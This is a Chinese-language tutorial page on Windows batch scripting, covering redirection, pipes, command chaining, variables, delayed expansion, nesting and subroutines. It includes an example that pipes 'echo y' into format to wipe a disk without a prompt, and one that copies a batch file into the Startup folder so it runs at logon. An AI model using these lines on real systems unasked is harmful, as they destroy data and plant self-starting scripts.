参数%0具有特殊的功能,可以调用批处理自身,以达到批处理本身循环的目的,也可以复制文件自身等
# 最简单的复制文件自身的方法
copy %0 d:\wind.bat

%行内注释内容%,不能出现重定向符号和管道符号
此时"注释内容"其实被当作变量,其值是空的,故只起注释作用,不过这种用法容易出现语法错误,一般不用。

</pre>

<h4>重定向符</h4><pre>
>字符是输出重定向命令,表示传递并覆盖,作用是将前面运行的结果传递到后面的范围,后边可以是文件或默认的系统控制台
>>符号是输出重定向命令,作用和>类似,区别>>是传递并在文件的末尾追加,而>是覆盖
<符号是输入重定向命令,从文件中读入命令输入,而不是从键盘中读入

在NT系列命令行中重定向的作用范围由整个命令行转变为单个命令语句,受到了命令分隔符&、&&、||和语句块的制约限制。

> echo hello > 1.txt  // 建立文件1.txt,内容为"hello ",定向符前的空格会被写入文件
> echo world >>1.txt
> type 1.txt
hello
world

>&将一个句柄的输出写入到另一个句柄的输入中。
<&刚好和>&相反,从一个句柄读取输入并将其写入到另一个句柄输出中。
常用句柄:0、1、2,未定义句柄:3—9
1>nul 表示禁止输出正确的信息
2>nul 表示禁止输出错误信息。
其中的1与2都是代表某个数据流输入输出的地址(NT CMD称之为句柄,MSDOS称之为设备)
句柄0:标准输入stdin,键盘输入,stdin可被<重定向
句柄1:标准输出stdout,输出到命令提示符窗口(console,代码为CON),stdout可被>、>>重定向
句柄2:标准错误stderr,输出到命令提示符窗口(console,代码为CON)

读取文本中的内容可以用for命令,但如果只需要读取第一行用for命令就有点麻烦,运行如下显示批处理文件自身的第一行:@echo off
@echo off
# SET /P variable=[promptString]/P允许将变量数值设成用户输入的一行输入。读取输入行之前显示指定的promptString。promptString可以是空的
set /p str=<%0
echo %str%
pause

</pre>

<h4>| 命令管道符</h4><pre>
第一条命令 | 第二条命令 [| 第三条命令...]
将第一条命令的结果作为第二条命令的参数来使用,在unix中这种方式很常见

dir c:\|find "txt"
tasklist | more         enter键翻页,逐行翻页
ipconfig | findstr IP   在ipconfig回显中查找带有关键字IP的一行

format格盘时要输入y来确认是否格盘,这个命令前加上echo y并用|字符来将echo y的结果传给format命令,从而达到自动输入y的目的
echo y|format a: /s /q /v:system

</pre>

<h4>&、&&、||组合命令</h4><pre>
&、&&、||组合命令就是可以把多个命令组合起来当一个命令来执行,因为批处理认行不认命令数目。

语法:第一条命令 & 第二条命令 [& 第三条命令...]
这个符号允许在一行中使用2个以上不同的命令,&两边的命令是顺序执行的,从前往后执行,第一个命令执行失败也不影响后边的命令执行。
dir z:\ & dir c:\ & dir d:\  # 连续显示z,c,d盘的内容,不理会该盘是否存在

语法:第一条命令 && 第二条命令 [&& 第三条命令...]
用这种方法可以同时执行多条命令,当碰到执行出错的命令后将不执行后面的命令,如果一直没有出错则一直执行完所有命令
dir z:\ && dir y:\ && dir c:\

语法:第一条命令 || 第二条命令 [|| 第三条命令...]
用这种方法可以同时执行多条命令,当一条命令失败后才执行第二条命令,当碰到执行正确的命令后将不执行后面的命令,如果没有出现正确的命令则一直执行完所有命令;

组合命令和重定向命令一起使用必须注意优先级
管道命令的优先级高于重定向命令,重定向命令的优先级高于组合命令

问题:把C盘和D盘的文件和文件夹列出到a.txt文件中:
dir c:\ && dir d:\ > a.txt
这样执行后a.txt里只有D盘的信息,因为组合命令的优先级没有重定向命令的优先级高,所以这句在执行时将本行分成这两部分:dir c:\和dir d:\ > a.txt
要使用组合命令&&达到要求,必须得这么写:
dir c:\ > a.txt && dir d:\ >> a.txt
这样依据优先级高低,DOS将把这句话分成以下两部分:dir c:\ > a.txt和dir d:\ >> a.txt
还可以利用&命令:
dir c:\ > a.txt & dir d:\ >> a.txt
也可以用 dir c:\;d:\ >>a.txt 来实现

【 '' 字符串界定符 】
双引号允许在字符串中包含空格,进入一个特殊目录program files可以用如下方法
cd 'program files'
cd progra~1
cd pro*

【 , 逗号 】
逗号相当于空格
dir,c:\

【 ; 分号 】
当命令相同时可以将不同目标用;隔离,但执行效果不变,如执行过程中发生错误则只返回错误报告,但程序仍会执行

dir d:\;e:\;z:\
以上命令相当于
dir d:\
dir e:\
dir f:\
如果其中z盘不存在,运行显示:系统找不到指定的路径,然后终止命令的执行。

dir c:\;d:\;e:\1.txt
以上命令相当于
dir c:\
dir d:\
dir e:\1.txt
其中文件e:\1.txt不存在,但e盘存在,有错误提示,但命令仍会执行。
如果目标路径不存在则终止执行;如果路径存在仅文件不存在则继续执行。

【 () 括号 】
小括号在批处理编程中可以包括多行命令,这些命令将被看成一个整体,视为一条命令行。
括号在for语句和if语句中常见,用来嵌套使用循环或条件语句,其实括号()也可以单独使用

echo 1 & echo 2 & echo 3
可以写成:
(
echo 1
echo 2
echo 3
)
上面两种写法效果一样,这两种写法都被视为是一条命令行。
这种多条命令被视为一条命令行时,如果其中有变量就涉及到变量延迟的问题。

【 ! 感叹号 】
在变量延迟问题中用来表示变量,即%var%应该表示为!var!

</pre>
</div>

<div id="var">
<h3>批处理中的变量分为两类:系统变量和自定义变量</h3>
<h4>DOS系统变量</h4><pre>
系统变量的值由系统将其根据事先定义的条件自动赋值,即这些变量系统已经给他们定义了值,不需要赋值,只需要调用

> set
%ALLUSERSPROFILE% 本地 返回所有用户配置文件的位置。
%APPDATA%         本地 返回默认情况下应用程序存储数据的位置。
%CD%              本地 返回当前目录字符串。
%CMDCMDLINE%      本地 返回用来启动当前的Cmd.exe的准确命令行。
%CMDEXTVERSION%   系统 返回当前的"命令处理程序扩展"的版本号。
%COMPUTERNAME%    系统 返回计算机的名称。
%COMSPEC%         系统 返回命令行解释器可执行程序的准确路径。
%DATE%            系统 返回当前日期,使用与date /t命令相同的格式,由Cmd.exe生成
%ERRORLEVEL%      系统 返回上一条命令的错误代码,通常用非零值表示错误。
%HOMEDRIVE%       系统 返回连接到用户主目录的本地工作站驱动器号,基于主目录值而设置,用户主目录是在"本地用户和组"中指定的。
%HOMEPATH%        系统 返回用户主目录的完整路径,基于主目录值而设置,用户主目录是在"本地用户和组"中指定的。
%HOMESHARE%       系统 返回用户的共享主目录的网络路径。基于主目录值而设置。用户主目录是在"本地用户和组"中指定的。
%LOGONSERVER%     本地 返回验证当前登录会话的域控制器的名称。
%NUMBER_OF_PROCESSORS%   系统 指定安装在计算机上的处理器的数目。
%OS%              系统 返回操作系统名称。Windows2000显示其操作系统为Windows_NT。
%PATH%            系统 指定可执行文件的搜索路径。
%PATHEXT%         系统 返回操作系统认为可执行的文件扩展名的列表。
%PROCESSOR_ARCHITECTURE%  系统 返回处理器的芯片体系结构。值:x86或IA64基于Itanium
%PROCESSOR_IDENTFIER%     系统 返回处理器说明。
%PROCESSOR_LEVEL%         系统 返回计算机上安装的处理器的型号。
%PROCESSOR_REVISION%      系统 返回处理器的版本号。
%PROMPT%        本地 返回当前解释程序的命令提示符设置。由Cmd.exe生成。
%RANDOM%        系统 返回0到32767之间的任意十进制数字。由Cmd.exe生成。
%SYSTEMDRIVE%   系统 返回包含Windows server operating system根目录(即系统根目录)的驱动器。
%SYSTEMROOT%    系统 返回Windows server operating system根目录的位置。
%TEMP% 和 %TMP% 系统和用户 返回对当前登录用户可用的应用程序所使用的默认临时目录。有些应用程序需要TEMP,有些需要TMP。
%TIME%          系统 返回当前时间。使用与time /t命令相同的格式。由Cmd.exe生成
%USERDOMAIN%    本地 返回包含用户帐户的域的名称。
%USERNAME%      本地 返回当前登录的用户的名称。
%USERPROFILE%   本地 返回当前用户的配置文件的位置。
%WINDIR%        系统 返回操作系统目录的位置。

CMD显示一个变量的值
echo %WINDIR%

复制文件到当前帐号的启动目录里,有空格的目录要用引号引起来
copy d:\1.bat '%USERPROFILE%\「开始」菜单\程序\启动\'

【 随机数(%random%)的应用技巧 】
%RANDOM%系统变量返回由Cmd.exe生成0到2的15次方即32767之间的任意十进制数字,即15位二进制数的范围。

</pre>获取100以内的随机数:将%RANDOM%按100进行求余运算即可<textarea># 生成5个100以内的随机数
@echo off
setlocal enabledelayedexpansion
for /L %%i in (1 1 5) do(
   set /a randomNum=!random!%%100
   echo 随机数:!randomNum!
)
pause
输出:
随机数:91
随机数:67
随机数:58
随机数:26
随机数:20

</textarea>生成给定位数的随机密码:将26个英文字母或10数字以及其它特殊字符组成一个字符串,随机抽取其中的若干字符<textarea>参考1:(简单)
@echo off
call :randomPassword 5 pass1 pass2
echo %pass1% %pass2%
pause
exit

:randomPassword
::---------生成随机密码
::---------%1为密码长度,%2及以后为返回变量名称
::---------for命令最多只能区分31个字段
@echo off
set password_len=%1
if not defined password_len goto :eof
if %password_len% lss 1 goto :eof
set wordset=a b c d e f g h i j k l m n o p q r s t u v w x y z
set return=
set num=0
:randomPassword1
set /a num+=1
set /a numof=%random%%%26+1
for /f 'tokens=%numof% delims= ' %%i in ('%wordset%') do set return=%return%%%i
if %num% lss %password_len% goto randomPassword1
if not '%2'=='' set %2=%return%
shift /2
if not '%2'=='' goto randomPassword
goto :eof

参考2:(最优,涉及到变量嵌套和命令嵌套的应用)
@echo off
call :randomPassword 6 pass1 pass2 pass3
echo %pass1% %pass2% %pass3%
pause
exit

:randomPassword
::---------生成随机密码
::---------%1为密码长度,%2及以后为返回变量名称
::---------goto循环、变量嵌套、命令嵌套
@echo off
if '%1'=='' goto :eof
if %1 lss 1 goto :eof
set password_len=%1
set return=
set wordset=abcdefghijklmnopqrstuvwxyz023456789_
::---------------------------循环
:randomPassword1
set /a numof=%random%%%36
call set return=%return%%%wordset:~%numof%,1%%
set /a password_len-=1
if %password_len% gtr 0 goto randomPassword1
::---------------------------循环
if not '%2'=='' set %2=%return%
shift /2
if not '%2'=='' goto randomPassword
goto :eof

</textarea><pre>
【 errorlevel 】
echo %errorlevel%
程序返回码,每个命令运行结束可以用这个命令行格式查看返回码,用于判断刚才的命令是否执行成功,默认值为0,一般命令执行出错会设errorlevel为1

以下就是几个常用命令的返回值及其代表的意义:
backup
0 备份成功
1 未找到备份文件
2 文件共享冲突阻止备份完成
3 用户用ctrl-c中止备份
4 由于致命的错误使备份操作中止

diskcomp
0 盘比较相同
1 盘比较不同
2 用户通过ctrl-c中止比较操作
3 由于致命的错误使比较操作中止
4 预置错误中止比较

diskcopy
0 盘拷贝操作成功
1 非致命盘读/写错
2 用户通过ctrl-c结束拷贝操作
3 因致命的处理错误使盘拷贝中止
4 预置错误阻止拷贝操作

format
0 格式化成功
3 用户通过ctrl-c中止格式化处理
4 因致命的处理错误使格式化中止
5 在提示"proceed with format(y/n)?"下用户键入n结束

xcopy
0 成功拷贝文件
1 未找到拷贝文件
2 用户通过ctrl-c中止拷贝操作
4 预置错误阻止文件拷贝操作
5 拷贝过程中写盘错误

【 批处理文件的参数 】
一些系统变量代表一个意思或一个操作: %0 %1 %2 %3 %4 %5 %6 %7 %8 %9和%*
参数是指在运行批处理文件时在文件名后加的以空格或Tab分隔的字符串,%0表示批处理命令本身,其它参数字符串用%1到%9顺序表示

%1 返回批处理的第一个参数
%2 返回批处理的第二个参数
%3-%9依此推类
%* 一次返回全部参数的值,不用在输入%1 %2来一个个的确定

@echo off
echo %1 %2 %3 %4
echo %1
echo %2
echo %3
echo %4
echo %*

C:\f.bat内容如下,C:'>f a:执行f.bat时%1就表示a:,这样format %1就相当于format a:
@echo off
format %1

C:\t.bat内容如下,运行C:'>t a.txt b.txt,%1表示a.txt,%2表示b.txt,即顺序地显示a.txt和b.txt文件的内容
@echo off
type %1
type %2

%0返回批处理所在绝对路径: 桌面保存为test.BAT,运行显示结果"C:\Users\lenovo\Desktop\test.BAT"
@echo off
echo %0
pause

%0引用批处理本身,无限循环执行BAT: 无限循环执行net user这条命令,直到手动停止
@echo off
net user
%0

【 shift 】
调整批处理文件中可替换参数的位置
SHIFT [/n]

如果命令扩展名被启用,SHIFT命令支持/n命令行开关;该命令行开关告诉命令从第n个参数开始移位;n介于零和八之间。
SHIFT /2  # 将%3移位到%2,将%4移位到%3等等;并且不影响%0和%1

</pre>

<h4>使用set命令自定义变量</h4><pre>
set命令显示、设置或删除Windows环境变量

cmd> set        // 查看所有系统环境变量
cmd> set w      // 查看所有以w开头的环境变量,不区分大小写,当前环境中找不到该变量时SET命令将把ERRORLEVEL设置成1
cmd> set windir // 查看环境变量windir

语法
SET [variable=[string]]
variable  指定环境变量名。
string    指定要指派给变量的一系列字符串

@echo off
rem var为变量名,=号右边是要给变量的值
set var=我是变量var的值
rem 引用变量var就把var变量名用%括起来
echo %var%  && rem 我是变量var的值

set var=abcdefg
echo %var%  && rem abcdefg
set var="abcdefg"
echo %var%  && rem "abcdefg"
set "var=abcdefg"
echo %var%  && rem abcdefg
pause>nul

等号两边的空格将形成变量名和变量值的一部分
set now=11:11:11.11
echo %now"
11:11:11.11
set now = 0:47:47.47
echo %now "
 0:47:47.47

set加引号
由于计算符中有些是在其它命令中也是有其意义的,所以对于加引号有些是必须的,
好处: 1、如有特殊符不加转义符 2、可清晰看出其尾部有无空格

set str=ok>
这个在批处理运行过程中会出错,系统会提示:“命令语法不正确。”
因为变量str中的值“ok>”的字符">"为一特殊字符,会被系统当成定向处理,所以会运行出错,如果要设置变量str值为"ok>"解决办法:
1、将特殊字符转义,转义方法在该特殊字符前加一个“^”,如:set str=ok^> (这种方法比较少用,因为没有多少应用价值)
2、常见的解决办法,在set后面将整个表达式用引号括起来,如:set "str=>"

rem 两个变量拼接,等号前后一定不要有空格
set str1=Hello
set str2=world
set result="%str1%, %str2%"
echo %result%

环境变量替换已如下增强:
%PATH:str1=str2%
会扩展PATH环境变量,用"str2"代替扩展结果中的每个"str1"。
要有效地从扩展结果中删除所有的"str1","str2"可以是空的。
"str1"可以以星号打头,这种情况下"str1"会从扩展结果的开始到str1剩余部分第一次出现的地方都一直保持相配。

也可以为扩展名指定子字符串。
%PATH:~10,5%
会扩展PATH环境变量,然后只使用在扩展结果中从第11个(偏移量10)字符开始的五个字符。如果没有指定长度则采用默认值即变量数值的余数。如果两个数字(偏移量和长度)都是负数,使用的数字则是环境变量数值长度加上指定的偏移量或长度。
%PATH:~-10%会提取PATH变量的最后十个字符。
%PATH:~0,-2%会提取PATH变量的所有字符,除了最后两个。

终于添加了延迟环境变量扩充的支持。该支持总是按默认值被停用,但也可通过CMD.EXE的/V命令行开关而被启用/停用。请参阅 CMD /?

考虑到读取一行文本时所遇到的目前扩充的限制时,延迟环境变量扩充是很有用的,而不是执行的时候。以下例子说明直接变量扩充的问题:

set VAR=before
if "%VAR%" == "before" (
    set VAR=after
    if "%VAR%" == "after" @echo If you see this, it worked
)

不会显示消息,因为在读到第一个IF语句时,BOTH IF语句中的%VAR%会被代替;原因是: 它包含IF的文体,IF是一个复合语句。所以复合语句中的IF实际上是在比较"before"和"after",这两者永远不会相等。同样以下这个例子也不会达到预期效果:

set LIST=
for %i in (*) do set LIST=%LIST% %i
echo %LIST%

原因是它不会在目前的目录中建立一个文件列表,而只是将LIST 变量设成找到的最后一个文件。这也是因为%LIST%在FOR语句被读取时只被扩充了一次;而且那时的LIST变量是空的。因此真正执行的FOR循环是:
for %i in (*) do set LIST= %i
这个循环继续将LIST设成找到的最后一个文件。

延迟环境变量扩充允许使用一个不同的字符(惊叹号)在执行时间扩充环境变量。如果延迟的变量扩充被启用,可以将上面例子写成以下所示,以达到预期效果:

set VAR=before
if "%VAR%" == "before" (
    set VAR=after
    if "!VAR!" == "after" @echo If you see this, it worked
)

set LIST=
for %i in (*) do set LIST=!LIST! %i
echo %LIST%

如果命令扩展被启用,有几个动态环境变量可以被扩展,但不会出现在SET显示的变量列表中。每次变量数值被扩展时这些变量数值都会被动态计算。如果用户用这些名称中任何一个明确定义变量,那个定义会替代下面描述的动态定义:
%CD% - 扩展到当前目录字符串。
%DATE% - 用跟DATE命令同样的格式扩展到当前日期。
%TIME% - 用跟TIME命令同样的格式扩展到当前时间。
%RANDOM% - 扩展到0和32767之间的任意十进制数字。
%ERRORLEVEL% - 扩展到当前ERRORLEVEL数值。
%CMDEXTVERSION% - 扩展到当前命令处理器扩展版本号。
%CMDCMDLINE% - 扩展到调用命令处理器的原始命令行。
%HIGHESTNUMANODENUMBER% - 扩展到此计算机上的最高NUMA节点号。

【 set /a expression: 可用各种表达式为变量赋值 】
/A命令行开关指定等号右边的字符串为被评估的数字表达式,该表达式评估器很简单并以递减的优先权顺序支持下列操作:
()                  - 分组
! ~ -               - 一元运算符
* / %               - 算数运算符
+ -                 - 算数运算符
<< >>               - 逻辑移位
&                   - 按位"与"
^                   - 按位"异"
|                   - 按位"或"
= *= /= %= += -= &= ^= |= <<= >>=   - 赋值
,                   - 表达式分隔符

如果使用任何逻辑或取余操作符,需要将表达式字符串用引号扩起来。在表达式中的任何非数字字符串键作为环境变量名称,这些环境变量名称的值已在使用前转换成数字。如果指定了一个环境变量名称,但未在当前环境中定义,那么值将被定为零。这使你可以使用环境变量值做计算而不用键入那些%符号来得到它们的值。如果SET /A在命令脚本外的命令行执行的,那么它显示该表达式的最后值。该分配的操作符在分配的操作符左边需要一个环境变量名称。除十六进制有0x前缀,八进制有0前缀的,数字值为十进位数字。因此0x12与18和022
相同。请注意八进制公式可能很容易搞混:08和09是无效的数字,因为8和9不是有效的八进制位数

</pre><textarea>> set /a 3*2-1
5

@echo off
rem +运算符
set /a var=1+1
echo %var% && rem 2

set /a var=2 - 1 减法运算
set /a var=2 * 2 乘法运算
set /a var=2 / 2 除法运算

rem 自增
set /a var = %var% + 1
set /a var+=1
echo %var% && rem 3

rem *运算符
set /a var*=2
echo %var% && rem 8

rem ()运算符
set /a var=(1+1) + (1+1)
echo %var% && rem 4

rem ,运算符,注意求varB和varC时两种写法的区别
set /a varA=var, varB=%var%*2, varC=var*3
echo %varA% %varB% %varC% && rem 8 16 24

rem 与运算符&、或运算符|、异运算符^必须双引号括起来,否则会被处理成组合命令
set /a varD=1"&"0
echo %varD% && rem 0
set /a varE=1"|"0
echo %varE% && rem 1
set /a varF=0"^"0
echo %varF% && rem 0

set /a var= 1 "%" 1  取模运算
set /a var= 2 "<<" 2 位左移
set /a var= 4 ">>" 2 位右移

set /a var"&=" 1
set /a var = %var% "&" 1  # 同上

pause>nul

</textarea><pre>
【 SET /P variable=[promptString]:让用户手工输入变量的值,而不是在代码里指定 】
/P命令行开关允许将变量数值设成用户输入的一行输入。读取输入行之前显示指定的promptString。promptString可以是空的。

</pre><textarea>@echo off
rem var变量名,=号右边的是提示语,不是变量的值,变量的值由运行后用户用键盘输入
set /p var=请输入变量的值:
echo %var%
if %var% == 1 echo 您输入了 1
pause

</textarea><pre>
set的主要作用是赋值
1、set /p a=promptstring
先显示promptstring,再接受用户输入的内容,以回车表示结束,赋值给变量a

2、set /p a=promptstring<1.txt
先显示promptstring,再把<右边的1.txt文件中从第一个字符开始直到碰到回车符的内容赋值给变量a,通常表现为第一行

3、set /p a=promptstring＜nul
先显示promptstring,再把<右边nul中内容赋值给变量a,不用用户按回车就结束语句。因nul是空设备,故没有内容可赋值,变量a仍属未定义。

因为在接受用户输入前可先显示promptstring,故此set还可当作显示命令用,仅作为显示命令使用时可省略变量a
1、set /p =promptstring
显示promptstring,再接受用户输入的内容,以回车表示结束。如用户直接按回车则仅显示promptstring。
赋值给空变量,赋值意义已丧失,仅作显示之用,需用户按回车键结束语句,无多大实际用途

2、set /p =promptstring＜1.txt
先显示promptstring,再把<右边的1.txt文件中从第一个字符开始直到碰到回车符的内容赋值给空变量(无实际用途)

3、set /p =promptstring＜nul
先显示promptstring,再把<右边nul中内容赋值给空变量,不用用户按回车就结束语句,实际中常用这个句式作为显示语句。因显示promptstring后光标不换行,故实际中这个句式用到很多

set /p的特殊应用
在批处理中回显信息有两个命令,echo和set /p=＜nul,它们的共同点在于都是对程序执行信息的屏幕输出,区别在于echo是换行输出,而set /p=＜nul是不换行追回输出,利用这个性质可以做出比较漂亮的动画

</pre><textarea>@echo off
for /l %%i in (1 1 70) do (
  set /p=O＜nul
  for /l %%a in (1 1 50) do ver>nul
  rem 目的是利用for循环运行某一命令来达到延时的目的
)
pause>nul

</textarea><pre>
【 set替换作用:newvar = %var:find=replace% 】

</pre><textarea>@echo off
set src= China I love you
echo 替换前的值: "%src%" && rem 替换前的值: " China I love you"
set var=%a: =%
echo 替换后的值: "%var%" && rem 替换空格
set des=%src:love=hate%
echo 替换后的值: "%des%" && rem 替换后的值: " China I hate you"
set des=%src: =123%
echo 替换后的值: "%des%" && rem 替换后的值: "123China123I123love123you"
set des=%src:I=me%
echo 替换后的值: "%des%" && rem 替换后的值: " Chmena me love you"
set des=%src:you=she%
echo 替换后的值: "%des%" && rem 替换后的值: " China I love she"
pause>nul

</textarea><pre>
【 set取舍截取作用: newvar = %var:~start,length% 】
字符串截取功能统一语法格式为:%a:~[m[,n]]%
方括号表示可选,%为变量标识符,a为变量名,冒号分隔变量名和说明部分,符号~可理解为"偏移",m为偏移量(默认0),n为截取长度(默认全部)
百分号如果需要当成单一字符则必须写成%%

%Var:~start,len%  从0开始
%Var:~-len%  截取倒数len位
%Var:~0,-len%  截取从第一位开始,倒数第len位结束的值

</pre><textarea>@echo off
set src=www.baidu.com.cn
echo %src% && rem www.baidu.com.cn
set des=%src:~1,2%
echo %des% && rem ww
set des=%src:~4,5%
echo %des% && rem baidu
set des=%src:~1,7%
echo %des% && rem ww.baid
set des=%src:~5%
echo %des% && rem aidu.com.cn
set des=%src:~-5%
echo %des% && rem om.cn
set des=%src:~0,-5%
echo %des% && rem www.baidu.c
set des=%src:~2,-3%
echo %des% && rem w.baidu.com
pause>nul

</textarea><textarea>@echo off
set sp=bananarama:apple
for /f "tokens=1 delims=:" %%a in ("%sp%") do echo %%a
pause6

</textarea>把当前时间化成秒<textarea>echo %time%
rem 0:19:57.49
set /a "t=(%time:~,2%)*3600+(1%time:~3,2%-100)*60+1%time:~6,2%-100"
echo %t%
rem 1197

假如时间是早上7:03:02.99,那岂不是在%time:~,2%时出错了？
%time%如果小时数为一位数时前面加的是空格,而set/a 会忽略前置空格

</textarea>

<h4>setlocal与变量延迟</h4><pre>
@echo off
set a=4
set a=5 & echo %a%
pause
输出:4
为什么是4而不是5？

批处理运行命令的机制:
批处理读取命令时是按行读取的,for命令等其后用一对圆括号闭合的所有语句也当作一行,在处理之前要完成必要的预处理工作,其中就包括对该行命令中的变量赋值。
批处理在运行到"set a=5 & echo %a%"之前,先把这一句整句读取并做了预处理即对变量a赋了值,那么%a%当然就是4了

为了能够感知环境变量的动态变化,批处理设计了变量延迟,即在读取了一条完整的语句之后,不立即对该行的变量赋值,而会在某个单条语句执行之前再进行赋值,也就是说延迟了对变量的赋值。

开启变量延迟
变量延迟的启动语句是"setlocal enabledelayedexpansion",并且变量要用一对叹号括起来,否则就没有变量延迟的效果

</pre><textarea>@echo off
setlocal enabledelayedexpansion
set a=4
set a=5 & echo !a!
pause
输出:5

</textarea><textarea>@echo off
setlocal enabledelayedexpansion
for /l %%i in (1,1,5) do (
  set a=%%i
  echo !a!
)
pause
输出:
1
2
3
4
5
不用变量延迟结果:
ECHO 处于关闭状态。
ECHO 处于关闭状态。
ECHO 处于关闭状态。
ECHO 处于关闭状态。
ECHO 处于关闭状态。

</textarea>截取sp变量前面num个字符<textarea>@echo off & setlocal enabledelayedexpansion
set sp=bananarama
set num=5
set sp1=!sp:~0,%num%!
echo %sp1%
rem banan

set sp1=sp:~0,%num%
echo %sp1%
rem sp:~0,5

set sp1=%sp:~0,%num%%
echo %sp1%
rem num%
pause

</textarea><textarea>@echo off
:: 每6行拼接为一行,剩余的不够6行的显示在最后一行
::
::
set num=0
setlocal enabledelayedexpansion
for /f "delims=" %%i in (a.txt) do (
set /a num+=1
set str=!str! %%i
if !num! equ 6 echo !str! && set num=0 & set str=
)
if not "%str%"=="" echo %str%
pause

</textarea>在没有开启变量延迟的情况下,某条命令行中的变量改变必须到下一条命令才能体现,这一点也可以加以利用<textarea>@echo off
::目的:交换两个变量的值,但是不使用临时中间变量
set var1=abc
set var2=123
echo 交换前: var1=%var1% var2=%var2%
set var1=%var2% & set var2=%var1%
echo 交换后: var1=%var1% var2=%var2%
pause

</textarea>

<h4>变量嵌套与命令嵌套</h4><pre>
和其它编程语言相比,dos功能显得相对简单,要实现比较复杂的功能需要充分运用各种技巧,变量嵌套与命令嵌套就是此类技巧之一。

字符串截取功能%a:~[m[,n]]%是dos变量处理的通用格式,如果其中的m、n为变量,那么这种情况就是变量嵌套了。

变量word为"abcdefghij",变量num为"123456789"
%word:~4,1%为e,其中4可以从变量num中取值,即%num:~3,1%,写成组合形式如下:
%word:~%num:~3,1%,1%这种写法不能正确执行,%word:~(%num:~3,1%),1%同样不行,实现这种变量嵌套必须结合命令嵌套。

@echo off & setlocal enabledelayedexpansion
set word=abcdefghij
set num=123456789

echo %word:~%num:~3,1%,1%
rem abcdefghijnum:~3,1

echo %word:~(%num:~3,1%),1%
set start = %num:~3,1%
echo %word:~start,1%
rem word:~start,1

echo %word:~%start%,1%
rem abcdefghijstart

echo !word:~%num:~3,1%,1!
rem e
pause

命令嵌套
首先用一条dos命令生成一个字符串,而这个字符串是另一条dos命令,用call语句调用字符串将其执行得到最终结果。

# 用call语句实现命令嵌套
@echo off
set str1=aaa echo ok bbb
echo 初始字符串:%str1%
echo 生成命令字符串如下:
echo %str1:~4,7%
echo 运行命令字符串生成最终结果为:
call %str1:~4,7%
pause
输出:
初始字符串:aaa echo ok bbb
生成命令字符串如下:
echo ok
运行命令字符串生成最终结果为:
ok
请按任意键继续. . .

变量嵌套:两文本合二为一
1.txt
1.xxxxx:
2.xxxxx:
3.xxxxx:

2.txt
1.a 2.b 3.c

合并之后
1.xxxxx: a
2.xxxxx: b
3.xxxxx: c

方法1:
@echo off & setlocal enabledelayedexpansion
set n=0
for /f "tokens=2,4,6 delims=. "  %%i in (2.txt) do (
 set m1=%%i&set m2=%%j&set m3=%%k
 for /f "delims="  %%a in (1.txt) do (
 set /a n+=1
 call set mm=%%m!n!%%
 echo %%a !mm!
 )
)

方法2:
@echo off & setlocal enabledelayedexpansion
cd d:\test
for /f "tokens=1* delims=." %%i in (1.txt) do (
set /a n+=2
call :loop "%%i %%j" !n!
)
pause & exit
:loop
echo %1
echo %2
pause
set s=%1
for /f "tokens=%2 delims=. " %%a in (2.txt) do echo;%s:~1,-1%%%a
goto :eof

</pre>
</div>

<div id="subprogram">
<h4>子程序</h4><pre>
在批处理程序中可以调用外部可运行程序如exe程序,也可调用其他批处理程序,这些也可以看作子程序,但不够方便,如果被调用的程序很多就显得不够简明,在windows中批处理可以调用本程序中的一个程序段,相当于子程序,这些子程序一般放在主程序后面。

子程序调用格式:
CALL :label arguments

子程序语法:
:label
command1
command2
......
commandn
goto :eof

在子程序段中参数%0指标签:label
子程序一般放在最后,并且在主程序最后要加上exit或跳转语句,避免错误的进入子程序。
子程序和主程序中的变量都是全局变量,其作用范围都是整个批处理程序。
传至子程序的参数在call语句中指定,在子程序中用%1、%2至%9的形式调用,而子程序返回主程序的数据只需在调用结束后直接引用就可以了,当然也可以指定返回变量

</pre><textarea>@echo off
call :sub return 你好
echo 子程序返回值:%return%
pause

:sub
set %1=%2
goto :eof
运行结果:你好

</textarea>设计一个求多个整数相加的子程序<textarea>@echo off
set sum=0
call :sub sum 10 20 35
echo 数据求和结果:%sum%
pause

:sub
rem 参数1为返回变量名称
set /a %1=%1+%2
shift /2
if not '%2'=='' goto sub
goto :eof

</textarea><pre>
【 CALL命令 】
CALL命令可以在批处理执行过程中调用另一个批处理,并且不终止父批处理程序,当另一个批处理执行完后再继续执行原来的批处理
call命令接受用作调用目标的标签。如果在脚本或批处理文件外使用Call,它将不会在命令行起作用。

CALL command
调用一条批处理命令,和直接执行命令效果一样,特殊情况下很有用,比如变量的多级嵌套
在批处理编程中可以根据一定条件生成命令字符串,用call可以执行该字符串

CALL [drive:][path]filename [batch-parameters]
调用的其它批处理程序,filename参数必须具有.bat或.cmd扩展名。

CALL :label arguments
调用本文件内命令段,相当于子程序。被调用的命令段以标签:label开头,以命令goto :eof结尾。

批脚本文本参数
批脚本里的 %* 指出所有的参数(如 %1 %2 %3 %4 %5 ...)
批参数(%n)的替代已被增强:
%~1     - 删除引号('),扩充%1
%~f1    - 将%1扩充到一个完全合格的路径名
%~d1    - 仅将%1扩充到一个驱动器号
%~p1    - 仅将%1扩充到一个路径
%~n1    - 仅将%1扩充到一个文件名
%~x1    - 仅将%1扩充到一个文件扩展名
%~s1    - 扩充的路径指含有短名
%~a1    - 将%1扩充到文件属性
%~t1    - 将%1扩充到文件的日期/时间
%~z1    - 将%1扩充到文件的大小
%~$PATH:1 - 查找列在PATH环境变量的目录,并将%1扩充到找到的第一个完全合格的名称。如果环境变量名未被定义或没有找到文件,此组合键会扩充到空字符串

可以组合修定符来取得多重结果:
%~dp1   - 只将%1扩展到驱动器号和路径
%~nx1   - 只将%1扩展到文件名和扩展名
%~dp$PATH:1 - 在列在PATH环境变量中的目录里查找%1,并扩展到找到的第一个文件的驱动器号和路径。
%~ftza1 - 将%1扩展到类似DIR的输出行。

在上面的例子中,%1和PATH可以被其他有效数值替换。
%~ 语法被一个有效参数号码终止。%~ 修定符不能跟 %*使用
参数扩充时不理会参数所代表的文件是否真实存在,均以当前目录进行扩展

例:
@echo off
Echo 产生一个临时文件 > tmp.txt
Rem 下一行先保存当前目录,再将c:\windows设为当前目录
pushd e:\wamp64\www
Call :sub tmp.txt
Rem 下行恢复前次的当前目录
Popd
Call :sub tmp.txt
pause
Del tmp.txt
exit
:sub
Echo 删除引号: %~1
Echo 扩充到路径: %~f1
Echo 扩充到一个驱动器号: %~d1
Echo 扩充到一个路径: %~p1
Echo 扩充到一个文件名: %~n1
Echo 扩充到一个文件扩展名: %~x1
Echo 扩充的路径指含有短名: %~s1
Echo 扩充到文件属性: %~a1
Echo 扩充到文件的日期/时间: %~t1
